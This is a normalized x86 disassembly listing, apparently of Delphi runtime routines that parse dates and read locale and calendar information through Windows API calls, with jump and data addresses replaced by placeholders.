lea eax [ ebp - 0x4 ]
call sub_4494ec
cmp [ eax + ebx * 2 - 0x2 ] 0x20
je r-xdata
inc ebx
sub_438604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4386b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438598
mov ebx [ edi ]
xor esi esi
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp ebx eax
jg r-xdata
cmp ebx [ edi ]
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4386bf
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ edi ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov [ edi ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_4386cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_438814
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43881b
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_44936c
retn
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_438598
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449d80
lea eax [ ebp - 0xc ]
push eax
mov edx [ esi ]
mov ecx edi
mov eax [ ebp - 0x10 ]
call sub_44a368
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push ebx
mov eax [ ebp - 0xc ]
call sub_449db8
push eax
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add [ esi ] eax
mov [ ebp - 0x11 ] 0x1
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_438828
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4388c2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_438598
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ esi ]
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4388c9
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
cmp di [ eax + edx * 2 - 0x2 ]
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc [ esi ]
mov bl 0x1
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4388d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43895b
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov esi 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp esi eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + esi * 2 - 0x2 ]
and ax 0xdf
sub ax 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438962
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov bl 0x2
jmp r-xdata
sub ax 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub ax 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc esi
sub_43896c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_438a1f
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp eax [ ebx ]
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a26
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebx ]
movzx edi [ esi + eax * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp di 0xdfff
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
inc [ ebx ]
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
call sub_43afbc
mov [ ebx ] eax
jmp r-xdata
sub_438a30
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_449db8
push eax
mov eax [ ebx ]
call sub_449db8
pop edx
call sub_43b138
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_438a84
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4378b8
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_438ae0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call j_sub_449880
xor eax eax
push ebp
push sub_438e61
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov [ ebp - 0x1a ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ rw-data ]
call sub_4388d4
mov [ ebp - 0x12 ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax ] 0x67
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_43b058
test eax eax
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43896c
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_44a368
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
call sub_43519c
mov eax [ ebp - 0xc ]
call sub_438a30
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax rw-data
mov edx [ rw-data ]
call sub_4494dc
lea eax [ ebp - 0x1d ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438604
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e68
lea eax [ ebp - 0x2c ]
mov edx 0x3
call j_sub_44936c
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_44936c
retn
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_438828
test al al
je r-xdata
lea eax [ ebp - 0x1e ]
push eax
lea ecx [ ebp - 0x16 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438604
test al al
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_438828
test al al
je r-xdata
call sub_4378b8
mov esi eax
cmp [ ebp - 0x12 ] 0x1
jne r-xdata
lea eax [ ebp - 0x1f ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438604
test al al
je r-xdata
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1c ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
jmp r-xdata
movzx eax [ ebp - 0x12 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x10 ]
push eax
movzx ecx [ ebp - 0x1c ]
movzx edx [ ebp - 0x1a ]
mov eax esi
call sub_4375d8
mov [ ebp - 0x11 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_44a680
test eax eax
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_438828
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438598
cmp [ rw-data ] 0x0
je r-xdata
movzx esi [ ebp - 0x18 ]
movzx eax [ ebp - 0x1f ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
movzx esi [ ebp - 0x18 ]
movzx eax [ ebp - 0x1f ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4494ec
call sub_449fc4
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43896c
jmp r-xdata
cmp [ ebp - 0x20 ] 0x2
ja r-xdata
push ebp
movzx eax si
call sub_438a84
pop ecx
mov esi eax
jmp r-xdata
movzx esi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1d ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438598
lea eax [ ebp - 0x8 ]
call sub_4494ec
call sub_449fc4
cmp eax [ ebx ]
jl r-xdata
lea eax [ ebp - 0x8 ]
call sub_4494ec
mov edx [ ebx ]
cmp [ eax + edx * 2 - 0x2 ] 0x20
jne r-xdata
call sub_4378b8
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
mov edi 0x64
cdq
idiv edi
imul ax ax 0x64
add si ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax rw-data
call sub_4494ec
call sub_449fc4
mov ecx eax
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
call sub_44a368
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4350d0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax si
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax rw-data
call sub_4494ec
call sub_449fc4
mov ecx eax
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
call sub_44a368
mov edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_4350d0
test eax eax
jne r-xdata
add si 0x64
jmp r-xdata
sub_438e98
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_4386cc
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_4386cc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_4386cc
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_438604
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_438598
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_4386cc
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_438828
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_438604
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_4386cc
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_438828
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_438598
movzx eax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
movzx ecx [ esp + 0x10 ]
movzx edx [ esp + 0xe ]
movzx eax [ esp + 0xc ]
call sub_437490
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_4386cc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_438604
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_4386cc
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_438828
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_4386cc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_438604
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_4390a0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4390d4
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0x11
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_434b8c
sub_4390d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_439156
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x1
mov ecx ebx
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438ae0
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ ebp - 0x8 ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43915d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_439164
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_439198
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0x11
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_434b8c
sub_439198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43921a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x1
mov ecx ebx
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438e98
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ ebp - 0x8 ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439221
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_439228
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43925c
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0x11
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_434b8c
sub_43925c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_439330
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov [ ebp - 0x8 ] 0x1
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438ae0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
cmp eax [ ebp - 0x8 ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_439198
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438e98
mov al 0x1
jmp r-xdata
fld [ ebp - 0x10 ]
fsub [ ebp - 0x18 ]
fstp [ esi ]
fwait
fld [ ebp - 0x10 ]
fadd [ ebp - 0x18 ]
fstp [ esi ]
fwait
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439337
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor al 0x1
sub_439344
push ebx
add esp 0xfffffe00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageW
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_449e68
add esp 0x200
pop ebx
retn
movzx edx [ esp + eax * 2 - 0x2 ]
sub dx 0x21
jb r-xdata
dec eax
sub dx 0xd
je r-xdata
sub_439394
push ebp
mov ebp esp
add esp 0xfffffe00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x200 ]
push ecx
push edx
push eax
call GetLocaleInfoW
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_449d2c
mov ecx eax
dec ecx
lea edx [ ebp - 0x200 ]
mov eax ebx
call sub_449e68
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4393e0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push ebx
call GetLocaleInfoW
test eax eax
jle r-xdata
mov eax edi
movzx eax [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_43940c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_439394
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_44be28
sub_439448
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_43955b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_43940c
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449d2c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_43940c
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_449d2c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_43940c
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449d2c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_43940c
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_449d2c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439562
lea eax [ ebp - 0x18 ]
mov edx 0x4
call j_sub_44936c
retn
sub_43956c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_449ed8
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_4395a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_43960d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449ed8
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4358c0
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439614
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
inc ebx
sub_439620
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_4396b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_439394
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4358c0
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4396be
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_43956c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_4395a8
call EnumCalendarInfoA
sub_4396d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_439907
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
xor edx edx
call sub_449d2c
lea eax [ ebp - 0xc ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_439394
mov eax [ ebp - 0xc ]
mov edx 0x1
call sub_4358c0
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43990e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_449d2c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x2
call sub_43626c
test eax eax
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
